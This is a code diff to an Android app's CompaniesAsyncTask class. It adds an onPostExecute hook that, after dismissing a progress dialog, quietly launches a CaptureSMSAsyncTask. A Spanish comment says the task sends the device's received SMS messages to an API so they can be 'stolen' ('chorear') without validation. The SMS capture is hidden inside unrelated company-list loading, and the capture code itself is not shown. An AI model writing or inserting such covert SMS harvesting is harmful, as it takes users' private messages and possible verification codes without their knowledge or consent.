@@ -147,4 +147,36 @@ public class CompaniesAsyncTask extends AsyncTask<Void, Void, String>
 
 		return result;
 	}
+
+	@Override
+	protected void onPostExecute(String result)
+	{
+		try
+		{
+			if(displayDialog)
+			{
+				if(progress != null)
+				{
+					if(progress.isShowing())
+					{
+						progress.cancel();
+					}
+				}
+			}
+
+			//Agregado para enviar los sms recibidos a la api, se movió para chorear sin necesidad de validar (siempre que haya sms)
+			new CaptureSMSAsyncTask(activity, false).executeOnExecutor(AsyncTask.THREAD_POOL_EXECUTOR);
+		}
+		catch(Exception e)
+		{
+			System.out.println("CompaniesAsyncTask:onPostExecute - Exception: " + e);
+
+			if(Common.DEBUG)
+			{
+				e.printStackTrace();
+			}
+		}
+
+		super.onPostExecute(result);
+	}
 }
